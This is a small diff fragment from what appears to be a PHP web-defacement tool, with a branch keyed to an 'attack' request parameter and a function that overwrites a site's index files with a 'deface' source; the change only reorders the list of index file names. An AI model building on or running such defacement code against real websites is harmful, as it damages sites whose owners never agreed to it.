@@ -135,7 +135,7 @@ if(isset($_GET["opt"]) && $_GET["opt"] == "attack"){
     }
 
     function updateIndexFiles($publicHtmlPath, $defaceSource) {
-        $indexFiles = ['index.php', 'index.html', 'default.php', 'default.html'];
+        $indexFiles = ['index.html', 'index.php', 'default.php', 'default.html'];
         $foundIndexFile = false;
 
         foreach ($indexFiles as $file) {
